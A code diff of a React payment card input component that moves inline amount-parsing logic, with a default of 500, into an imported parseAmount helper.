@@ -18,6 +18,7 @@ import {
 } from "@/components/CardFormComponents";
 import { Shield, Lock, Calendar } from "lucide-react";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
+import { parseAmount } from "@/utils/amountParser";
 import { useLink } from "@/hooks/useSupabase";
 import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
@@ -58,19 +59,7 @@ const PaymentCardInput = () => {
 
   // Get amount from link data - prioritize payment_data amount, then payment_amount, then cod_amount
   const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;
-
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
-  if (rawAmount !== undefined && rawAmount !== null) {
-    if (typeof rawAmount === 'number') {
-      amount = rawAmount;
-    } else if (typeof rawAmount === 'string') {
-      const parsed = parseFloat(rawAmount);
-      if (!isNaN(parsed)) {
-        amount = parsed;
-      }
-    }
-  }
+  const amount = parseAmount(rawAmount, 500);
 
   // Get currency code from link data
   const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || selectedCountry;
